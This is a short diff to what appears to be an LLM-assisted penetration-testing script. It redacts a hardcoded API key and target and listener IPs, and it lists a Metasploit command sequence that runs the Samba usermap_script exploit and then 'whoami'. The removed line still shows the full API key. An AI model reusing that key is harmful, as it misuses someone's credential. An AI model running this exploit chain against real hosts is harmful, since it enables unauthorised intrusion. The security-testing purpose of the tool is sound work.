@@ -16,7 +16,7 @@ command_extract_model_object = dynamic_import(
         )
 
 RagModule = Rag_module(datapath)
-generatorAgent = RagModule.rag_init(vectorPath , apiKey = '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')
+generatorAgent = RagModule.rag_init(vectorPath , apiKey = 'sk-*************')
 commandExtractor = command_extract_model_object
 
 (text_3,command_extractor_session_id,) = commandExtractor.send_new_message(PentestGPTPrompt.command_extractor_init)
@@ -26,8 +26,8 @@ commands = [
     'msfconsole',
     'use exploit/multi/samba/usermap_script',
     'search samba',
-    'set RHOSTS 10.129.230.226',
-    'set LHOST 10.10.16.163',
+    'set RHOSTS ...226',
+    'set LHOST ...163',
     'run',
     'whoami'
 ]
